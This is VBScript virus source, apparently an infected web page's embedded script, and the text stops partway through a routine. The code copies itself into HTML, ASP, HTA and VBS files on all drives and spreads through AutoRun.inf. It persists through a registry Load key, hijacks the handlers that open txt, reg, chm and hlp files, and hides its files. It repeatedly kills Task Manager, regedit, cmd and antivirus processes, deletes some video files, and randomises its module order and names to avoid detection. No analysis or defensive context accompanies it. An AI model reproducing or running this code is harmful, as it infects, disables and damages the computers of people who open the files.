<SCRIPT Language = VBScript>
'¾ËÆÄÀÎ4

'DKTAGMMETHKPD2_19

Function GetVersion(objfso, path_v)
    Dim FV, buffer
    Set FV = objfso.OpenTextFile(path_v, 1)
    buffer = FV.ReadAll()
    GetVersion = Mid(buffer, InStr(buffer, Head_V) + Len(Head_V), 1)
End Function

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select
        End If
    Next
End Function

Function GetSelfCode(objfso, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = objfso.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, Head_V)
    n1 = InstrRev(buffer, Tail_V)
    buffer = Mid(buffer, n, n1 - n + Len(Tail_V) + 1)
    GetSelfCode = buffer
    Self.Close
End Function

Function GetMainBody(vbsCode, Sum_ModelCode)
    Dim i
    For i = 2 To Sum_ModelCode
        GetMainBody = GetMainBody & VBCRLF & GetModelCode(vbsCode, i) & VBCRLF
    Next
End Function

'JTBLRJSOPBL2_19

'DKTAGMMETHKPD2_25

Sub DeleteReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub

Function ReadReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function

Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub

'JTBLRJSOPBL2_25

'DKTAGMMETHKPD2_26

Sub Run(ExeFullName)
    Dim WshShell
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub

Sub CopyFile(objfso, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = objfso.OpenTextFile(pathf, 2, true)
    vf.Write code
End Sub

Function ChangeName(vbsCode, Names)
    Dim Name, j, temp, buffer
    buffer = vbsCode
    Randomize
    For Each Name in Names
        temp = ""
        For j = 1 To Len(Name)
            temp = temp & Chr((Int(Rnd * 26) + 65))
        Next
        buffer = Replace(buffer, Name, temp)
    Next
    ChangeName = buffer
End Function

'JTBLRJSOPBL2_26

'DKTAGMMETHKPD1_6

Sub AutoRun(objfso, D, vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs, inf_autorun
    path_autorun = D & ":\AutoRun.inf"
    path_vbs = D & ":\" & Name_V1
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False Or GetVersion(objfso, path_vbs)<Version Then
        If objfso.FileExists(path_autorun) = True Then
            objfso.DeleteFile path_autorun, True
        End If

        If objfso.FileExists(path_vbs) = True Then
            objfso.DeleteFile path_vbs, True
        End If

        Call CopyFile(objfso, vbsCode, path_vbs)
        Call SetFileAttr(objfso, path_vbs)

        inf_autorun = "[AutoRun]" & VBCRLF & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun=´ò¿ª(&O)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun1=×ÊÔ´¹ÜÀíÆ÷(&X)" & VBCRLF & "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(objfso, inf_autorun, path_autorun)
        Call SetFileAttr(objfso, path_autorun)
    End If
End Sub

'JTBLRJSOPBL1_6

'DKTAGMMETHKPD1_9

Function ChangeModelOrder(vbsCode, Num_DNA)
    On Error Resume Next
    Dim DNA(), Array_vbsCode()
    Dim i, Value, flag, j, buffer
    ReDim DNA(Num_DNA), Array_vbsCode(Num_DNA)
    buffer = vbsCode
    Randomize
    For i = 1 To Num_DNA
        Do
            Value = Int((Num_DNA * Rnd) + 1)
            flag = 1

            For j = 1 To Num_DNA
                If Value = DNA(j) Then
                    flag = 0
                    Exit For
                End If
            Next

        Loop Until flag = 1

        DNA(i) = Value
    Next
    For i = 1 To Num_DNA
        Array_vbsCode(i) = GetModelCode(buffer, i)

    Next
    buffer = ""
    For i = 1 To Num_DNA
        buffer = buffer & VBCRLF & Array_vbsCode(DNA(i)) & VBCRLF
    Next
    ChangeModelOrder = Head_V & Version & VBCRLF & buffer & VBCRLF & Tail_V
End Function

'JTBLRJSOPBL1_9

'DKTAGMMETHKPD2_11

Sub SearchFile(objfso, strPath, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim pfo, pf, pfi, ext
    Dim psfo, ps
    Set pfo = objfso.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then
            Exit For
        End If
        ext = LCase(objfso.GetExtensionName(pfi.Path))

        Select Case ext
            Case "hta", "htm", "html", "asp", "vbs"
                Call InfectHead(pfi.Path, pfi, objfso, VbsCode_WebPage, VbsCode_Victim, ext, T)
            Case "mpg", "rmvb", "avi", "rm"
                If IsSexFile(pfi.Name) = True Then
                    pfi.Delete
                End If
        End Select
    Next
    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then
            Exit For
        End If
        Call SearchFile(objfso, ps.Path, VbsCode_WebPage, VbsCode_Victim, T)
    Next
End Sub

'JTBLRJSOPBL2_11

'DKTAGMMETHKPD1_2

Sub ExeVbs_WebPage()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetScriptCode("vbscript")
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Set objfso = Nothing
End Sub

Sub ExeVbs_Victim()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetSelfCode(objfso, WScript.ScriptFullName)
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Call Run(FullPath_V1)
    Set objfso = Nothing
End Sub

'JTBLRJSOPBL1_2

'DKTAGMMETHKPD1_4

Function Head()
    Head = VBCRLF & "'DKTAGMMETHKPD1_1" & VBCRLF &_
    "On Error Resume Next" & VBCRLF &_
    "Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V" & VBCRLF &_
    "Dim ModelHead, ModelTail" & VBCRLF &_
    "Cnt = 0" & VBCRLF &_
    "CntMax = 1000" & VBCRLF &_
    "Version = ""4""" & VBCRLF &_
    "Name_V1 = GetUserName() & "".vbs""" & VBCRLF &_
    "FullPath_V0 = GetSFolder(0) & Name_V1 'Ö÷ÒªÖ´ĞĞÎÄ¼ş¹ØÁª×ªÏò" & VBCRLF &_
    "FullPath_V1 = GetSFolder(1) & Name_V1 'Ö÷ÒªÖ´ĞĞÅäÖÃÎÄ¼şÃüÁî" & VBCRLF &_
    "FullPath_Config= GetSFolder(1) & GetUserName() & "".ini""" & VBCRLF &_
    "Sum_ModelCode = 26" & VBCRLF &_
    "Head_V= GetHeadTail(0)" & VBCRLF &_
    "Tail_V= GetHeadTail(1)" & VBCRLF &_
    "ModelHead=""'DKTAGMMETHKPD""" & VBCRLF &_
    "ModelTail=""'JTBLRJSOPBL""" & VBCRLF
End Function

Function VictimHead()
    VictimHead = Head() & VBCRLF &_
    "Call VictimMain()" & VBCRLF &_
    "Sub VictimMain()" & VBCRLF &_
    "    Call ExeVbs_Victim()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function VirusHead()
    VirusHead = Head() & VBCRLF &_
    "Call VirusMain()" & VBCRLF &_
    "Sub VirusMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_Virus()" & VBCRLF &_
    "End Sub" & VBCRLF & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function WebHead()
    WebHead = Head() & VBCRLF &_
    "Call WebMain()" & VBCRLF &_
    "Sub WebMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_WebPage()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

'JTBLRJSOPBL1_4

'DKTAGMMETHKPD1_8

Sub RestoreSystem(objfso)
    On Error Resume Next
    Dim Value, dc, d, HCULoad

    Call SafeSet()

    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    If ReadReg(HCULoad) = FullPath_V1 Then
        Call DeleteReg(HCULoad)
    End If

    Value = "%SystemRoot%\system32\NOTEPAD.EXE %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "regedit.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = GetSFolder(1) & "hh.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "%SystemRoot%\system32\winhlp32.exe %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = """%1"" %*"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\")<>Value Then
        Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\", Value, "REG_SZ")
    End If

    Set dc = objfso.Drives
    For Each d In dc
        If objfso.FileExists(d.DriveLetter & ":\" & Name_V1) = True Then
            objfso.DeleteFile d.DriveLetter & ":\" & Name_V1
            objfso.DeleteFile d.DriveLetter & ":\" & "AutoRun.inf"
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True Then
        Set vf = objfso.GetFile(FullPath_V1)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_V0) = true Then
        Set vf = objfso.GetFile(FullPath_V0)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_Config) = True Then
        objfso.DeleteFile FullPath_Config , True
    End If
End Sub

'JTBLRJSOPBL1_8

'DKTAGMMETHKPD1_1
On Error Resume Next
Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V
Dim ModelHead, ModelTail
Cnt = 0
CntMax = 1000
Version = "4"
Name_V1 = GetUserName() & ".vbs"
FullPath_V0 = GetSFolder(0) & Name_V1 'Ö÷ÒªÖ´ĞĞÎÄ¼ş¹ØÁª×ªÏò
FullPath_V1 = GetSFolder(1) & Name_V1 'Ö÷ÒªÖ´ĞĞÅäÖÃÎÄ¼şÃüÁî
FullPath_Config= GetSFolder(1) & GetUserName() & ".ini"
Sum_ModelCode = 26
Head_V= GetHeadTail(0)
Tail_V= GetHeadTail(1)
ModelHead="'DKTAGMMETHKPD"
ModelTail="'JTBLRJSOPBL"

Call WebMain()
Sub WebMain()
    On Error Resume Next
    Call ExeVbs_WebPage()
End Sub
'JTBLRJSOPBL1_1

'DKTAGMMETHKPD2_22

Function GetSFolder(p)
    Dim objfso
    Set objfso = CreateObject(GetFSOName())
    GetSFolder = objfso.GetSpecialFolder(p) & "\"
    Set objfso = Nothing
End Function

Function GetUserName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CURRENT_USER\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}\Username"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Administrator"
    Else
        GetUserName = UserName
    End If
End Function

Function GetFSOName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CLASSES_ROOT\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID\"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Scripting.FileSystemObject"
    Else
        GetFSOName = UserName
    End If
End Function

Function GetHeadTail(l)
    Dim Str , buffer
    If l = 0 Then
        GetHeadTail = "'" & GetUserName()
    Else
        buffer = GetUserName()
        Str = ""
        For i = 1 To Len(buffer)
            Str = Mid(buffer, i, 1) & Str
            GetHeadTail = "'" & Str
        Next
    End If
End Function

'JTBLRJSOPBL2_22

'DKTAGMMETHKPD2_18

Function IsOK(objfso, Now_V, path_f)
    On Error Resume Next
    Dim vf, p1, p2, p3
    IsOK = False
    Set vf = objfso.OpenTextFile(path_f, 1)
    p1 = Trim(vf.ReadLine)
    p2 = Trim(vf.ReadLine)
    p3 = Trim(vf.ReadLine)
    If StrComp(p1, "OK", 1) = 0 And StrComp(p2, Now_V, 1) = 0 Then
        IsOK = True
    End If
    If p3 = "Admin" Then
        MsgBox "You Are Admin!!! Your Computer Will Not Be Infected!!!"
        IsOK = True
        n = InputBox("0:ÍË³ö£» 1:¼àÊÓÏµÍ³£» 2:´«È¾ÎÄ¼ş", "SuperVirus½Å±¾²âÊÔ!")
        If n = 0 Then
            Wscript.Quit
        ElseIf n = 1 Then
            IsOK = True
        ElseIf n = 2 Then
            IsOK = False
        End If
    End If
End Function

'JTBLRJSOPBL2_18

'DKTAGMMETHKPD1_7

Sub InvadeSystem(objfso, vbsCode)
    On Error Resume Next
    Dim Value, HCULoad, vbsCode_Virus, dc, d

    Value = "%SystemRoot%\System32\WScript.exe " & """" & FullPath_V0 & """" & " %1 %* "
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    vbsCode_Virus = vbsCode

    Set dc = objfso.Drives
    For Each d In dc
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            Call AutoRun(objfso, d.DriveLetter, vbsCode_Virus)
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True And GetVersion(objfso, FullPath_V1)< Version Then
        objfso.DeleteFile FullPath_V1 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    End If

    If objfso.FileExists(FullPath_V0) = True And GetVersion(objfso, FullPath_V0)<Version Then
        objfso.DeleteFile FullPath_V0 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    End If

    If ReadReg(HCULoad)<> FullPath_V1 Then
        Call WriteReg (HCULoad, FullPath_V1, "")
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call SetTxtFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call SetRegFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call SetchmFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call SethlpFileAss(FullPath_V0)
    End If

    Call DeSafeSet()
End Sub

'JTBLRJSOPBL1_7

'DKTAGMMETHKPD2_15

Sub SetFileAttr(objfso, pathf)
    Dim vf
    Set vf = objfso.GetFile(pathf)
    vf.Attributes = 6
End Sub

'JTBLRJSOPBL2_15

'DKTAGMMETHKPD2_13

Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced, HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call WriteReg (HCUExplorer, 129, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 0, "REG_DWORD")
    Call WriteReg (HLMShow, 0, "REG_DWORD")
End Sub

Sub SafeSet()
    Dim HLMShow , HCUSSHidden, HCUHidden
    Dim HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUHidden = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
    Call WriteReg (HCUHidden, 1, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 1, "REG_DWORD")
    Call WriteReg (HLMShow, 1, "REG_DWORD")
End Sub

'JTBLRJSOPBL2_13

'DKTAGMMETHKPD2_23

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & ChangeModelOrder(strCode, Sum_ModelCode) & VBCRLF & "</" & "SCRIPT>"
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
    End If
End Function


'JTBLRJSOPBL2_23

'DKTAGMMETHKPD2_14

Function ReadOK(objfso, FullPath_OK)
    On Error Resume Next
    Dim vf, buffer
    Set vf = objfso.OpenTextFile(FullPath_OK, 1)
    buffer = vf.ReadAll
    ReadOK = RTrim(Mid(buffer, InStr(buffer, "Order:") + 6, 50))
End Function

Sub WriteOK(objfso, FullPath_OK, Order_Order, Order_Para)
    On Error Resume Next
    Dim vf1
    objfso.DeleteFile FullPath_OK, True
    Set vf1 = objfso.OpenTextFile(FullPath_OK, 2, True)
    vf1.Write "OK" & VBCRLF
    vf1.WriteLine Date()
    vf1.WriteLine "Order:" & Order_Order & "@" & Order_Para
    Call SetFileAttr(objfso, FullPath_OK)
End Sub

'JTBLRJSOPBL2_14

'DKTAGMMETHKPD2_16

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub



'JTBLRJSOPBL2_16

'DKTAGMMETHKPD2_20

Function GetModelCode(vbsCode, N_ModelCode)
    On Error Resume Next
    Dim n, n1, buffer
    buffer = vbsCode
    If N_ModelCode>= 1 And N_ModelCode<= 9 Then
        n = InStr(buffer, ModelHead & "1_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "1_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "1_" & N_ModelCode))
    ElseIf N_ModelCode>= 10 And N_ModelCode<= 99 Then
        n = InStr(buffer, ModelHead & "2_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "2_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "2_" & N_ModelCode))
    ElseIf N_ModelCode>= 100 And N_ModelCode<= 999 Then
        n = InStr(buffer, ModelHead & "3_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "3_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "3_" & N_ModelCode))
    End If
End Function

'JTBLRJSOPBL2_20

'DKTAGMMETHKPD2_21

Function IsSexFile(fname)
    IsSexFile = False
    If InStr(fname, "³ÉÈË")>0 Or InStr(fname, "Òù")>0 Or InStr(fname, "ÍµÅÄ")>0 Or _
                InStr(fname, "Íµ¿ú")>0 Or InStr(fname, "¿Ú½»")>0 Or InStr(fname, "Ç¿¼é")>0 Or _
                InStr(fname, "ÂÖ¼é")>0 Or InStr(fname, "Â×ÀíÆ¬")>0 Or InStr(fname, "×ÔÃş")>0 Then
        IsSexFile = True
    End If
End Function

Function Isinfected(buffer, ftype)
    Isinfected = True
    Select Case ftype
        Case "hta", "htm" , "html" , "asp", "vbs"
            If InStr(buffer, Head_V) = 0 Then
                Isinfected = False
            End If
        Case Else
            Isinfected = True
    End Select
End Function

'JTBLRJSOPBL2_21

'DKTAGMMETHKPD2_12

Sub InfectHead(strPath, fi, objfso, VbsCode_WebPage, VbsCode_Victim, ftype, T)
    On Error Resume Next
    Dim tso, buffer, strCode , Maxsize
    Maxsize = 350000
    If fi.Size< Maxsize Then
        Set tso = objfso.OpenTextFile(strPath, 1, True)
        buffer = tso.ReadAll()
        tso.Close

        If T = 0 Then
            Select Case ftype
                Case "hta", "htm", "html", "asp"
                    If Isinfected(buffer, ftype) = False Then
                        Set tso = objfso.OpenTextFile(strPath, 2, true)
                        strCode = MakeScript(VbsCode_WebPage, 0)
                        tso.Write strCode & VBCRLF & buffer
                        Cnt = Cnt + 1
                    End If
                Case "vbs"
                    If Isinfected(buffer, ftype) = False Then
                        n = InStr(buffer , "Option Explicit")
                        If n<>0 Then
                            buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        Else
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        End If
                    End If
                Case Else
                    '
                    '
            End Select

        ElseIf T = 1 Then
            If Isinfected(buffer, ftype) = True Then
                n = InStrRev(buffer , Tail_V)
                If n<>0 Then
                    buffer = Replace(buffer, Tail_V, "", n, 1, 1)
                    Set tso = objfso.OpenTextFile(strPath, 2, True)
                    tso.Write strCode & VBCRLF & buffer
                End If
            End If
        End If
    End If

End Sub

'JTBLRJSOPBL2_12

'DKTAGMMETHKPD2_10

Sub SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim d , dc
    Set dc = objfso.Drives
    For Each d In dc
        If Cnt >= CntMax Then '
            Exit For
        End If
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            'If d.DriveType = 1 Then
            Call SearchFile(objfso, d.Path & "\", VbsCode_WebPage, VbsCode_Victim, T)
            'End If
        End If
    Next
End Sub

'JTBLRJSOPBL2_10

'DKTAGMMETHKPD2_24

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Dim objShell, intReturn, name_exe
    Set objShell = WScript.CreateObject("WScript.Shell")
    strComputer = "."
    Set objWMIServices = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIServices.Execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            intReturn = objProcess.Terminate
            Select Case intReturn
                Case 2
                    name_exe = objProcess.Name
                    name_exe = Left(name_exe, Len(name_exe) -4)
                    objShell.Run "cmd.exe /c @tskill " & name_exe, 0, False
            End Select
        Next
    Next
    Set objShell = Nothing
End Sub

'JTBLRJSOPBL2_24

'DKTAGMMETHKPD1_5

Sub MonitorSystem(objfso, vbsCode)
    On Error Resume Next
    Dim ProcessNames
    ProcessNames = Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(objfso, vbsCode)
        WScript.Sleep 5000
    Loop
End Sub

'JTBLRJSOPBL1_5

'DKTAGMMETHKPD2_17

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    Dim strComputer, objWMIService, colProcessList, objProcess
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

'JTBLRJSOPBL2_17

'DKTAGMMETHKPD1_3

Sub ExeVbs_Virus()
    On Error Resume Next
    Dim objfso, objshell, FullPath_Self, Name_Self, Names
    Dim oArgs, ArgNum, Para_V, SubPara_V, RunPath
    Dim Order, Order_Order, Order_Para
    Dim vbsCode , VbsCode_Virus, VbsCode_WebPage, VbsCode_Victim , MainBody

    Set objfso = CreateObject(GetFSOName())
    Set objshell = CreateObject("WScript.Shell")
    FullPath_Self = WScript.ScriptFullName
    Name_Self = WScript.ScriptName
    Names = Array("DKTAGMMETHKPD", "JTBLRJSOPBL")

    Set oArgs = WScript.Arguments
    ArgNum = 0
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    SubPara_V = LCase(Right(Para_V, 3))
    Select Case SubPara_V
        Case "run"
            RunPath = Left(FullPath_Self, 2)
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "txt", "log"
            RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "reg"
            Para_V = "regedit.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "chm"
            Para_V = "hh.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "hlp"
            Para_V = "winhlp32.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
